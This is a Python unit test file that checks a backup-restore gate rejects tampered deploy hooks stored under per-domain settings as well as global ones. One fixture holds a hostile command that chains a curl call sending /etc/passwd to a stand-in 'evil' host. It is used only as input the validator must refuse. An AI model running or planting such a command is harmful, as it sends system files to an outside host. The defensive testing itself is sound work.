"""Restore hook revalidation must cover per-domain hooks, not only global ones.

`_revalidate_restored_deploy_hooks` refused a restore whose settings carried a
deploy hook the current validator rejects (audit finding M1) — but it only
collected ``deploy_hooks.global_hooks``. Per-domain hooks
(``deploy_hooks.domain_hooks[<domain>]``) run on renewal exactly like global
ones, so a tampered archive could smuggle a rejectable command under
domain_hooks and the restore would install it. The gate now validates both.
"""
import pytest

from modules.core.file_operations import FileOperations

pytestmark = [pytest.mark.unit]

_BAD = {
    'id': 'x', 'name': 'evil',
    'command': 'echo ok && curl http://evil/$(cat /etc/passwd)',
}
_GOOD = {'id': 'y', 'name': 'nice', 'command': 'echo deployed'}


def _revalidate(settings):
    return FileOperations._revalidate_restored_deploy_hooks(settings)


def test_a_rejectable_domain_hook_is_refused():
    settings = {'deploy_hooks': {
        'global_hooks': [], 'domain_hooks': {'example.com': [_BAD]}}}
    assert _revalidate(settings) is not None


def test_a_rejectable_global_hook_is_still_refused():
    """CONTROL: the case that already worked must keep working."""
    settings = {'deploy_hooks': {'global_hooks': [_BAD], 'domain_hooks': {}}}
    assert _revalidate(settings) is not None


def test_a_rejectable_hook_under_a_second_domain_is_found():
    """The bad hook is not in the first domain's list — the walk must cover
    every domain, not just the first."""
    settings = {'deploy_hooks': {'global_hooks': [], 'domain_hooks': {
        'a.example.com': [_GOOD], 'b.example.com': [_BAD]}}}
    assert _revalidate(settings) is not None


def test_all_good_hooks_pass():
    """CONTROL: a restore with only valid hooks (global and per-domain) is not
    refused, or the gate would block legitimate restores."""
    settings = {'deploy_hooks': {'global_hooks': [_GOOD], 'domain_hooks': {
        'example.com': [_GOOD]}}}
    assert _revalidate(settings) is None


def test_no_hooks_at_all_passes():
    assert _revalidate({'deploy_hooks': {}}) is None
    assert _revalidate({}) is None


def test_malformed_domain_hooks_are_refused_not_tolerated():
    """A malformed domain_hooks shape is exactly what save_config rejects, so
    the restore must reject it too — accepting it would install a config that
    crashes DeployManager on the next deploy. The validator is shared with
    save_config, so the two cannot drift again."""
    for shape in (
        {'deploy_hooks': {'domain_hooks': 'not-a-dict'}},
        {'deploy_hooks': {'domain_hooks': {'d': 'not-a-list'}}},
        {'deploy_hooks': {'domain_hooks': {'d': [None]}}},
    ):
        assert _revalidate(shape) is not None, (
            f"malformed shape was tolerated: {shape}")


def test_the_restore_validator_is_the_save_config_validator():
    """Regression guard for the root cause of this whole finding: the restore
    gate and the normal save path must run the SAME validator, or they drift
    (they had, and per-domain hooks slipped through). Both must reject a
    per-domain hook the other rejects."""
    from unittest.mock import MagicMock

    from modules.core.deployer import DeployManager

    block = {'domain_hooks': {'d': [_BAD]}}
    dm = DeployManager.__new__(DeployManager)
    dm.settings_manager = MagicMock()
    save_ok, save_err = dm.save_config({'enabled': True, **block})
    restore_err = _revalidate({'deploy_hooks': {'enabled': True, **block}})
    assert save_ok is False and restore_err is not None
